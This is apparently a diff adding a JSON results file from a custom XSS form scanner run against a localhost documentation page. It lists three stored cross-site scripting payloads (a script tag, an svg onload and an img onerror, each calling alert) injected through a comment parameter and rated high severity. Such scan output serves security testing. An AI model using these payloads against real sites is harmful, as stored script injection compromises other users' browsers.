@@ -1,0 +1,44 @@
+[
+  {
+    "url": "http://localhost:8000/documentation",
+    "vulnerable": true,
+    "vulnerability_type": null,
+    "vulnerable_parameters": [
+      "stored_comment",
+      "stored_comment",
+      "stored_comment"
+    ],
+    "payloads": [
+      {
+        "parameter": "stored_comment",
+        "payload": "<script>alert(\"XSS\")</script>",
+        "context": "html_content",
+        "evidence": [
+          "js_indicator_alert_found"
+        ]
+      },
+      {
+        "parameter": "stored_comment",
+        "payload": "<svg onload=alert(\"XSS\")>",
+        "context": "html_content",
+        "evidence": [
+          "js_indicator_alert_found"
+        ]
+      },
+      {
+        "parameter": "stored_comment",
+        "payload": "<img src=x onerror=alert(\"XSS\")>",
+        "context": "html_content",
+        "evidence": [
+          "js_indicator_alert_found"
+        ]
+      }
+    ],
+    "contexts": [],
+    "severity": "high",
+    "owasp_category": "A03:2021 \u2013 Injection",
+    "timestamp": "2025-09-02T20:17:28.892396",
+    "tool": "custom_form_tester",
+    "method": "POST"
+  }
+]
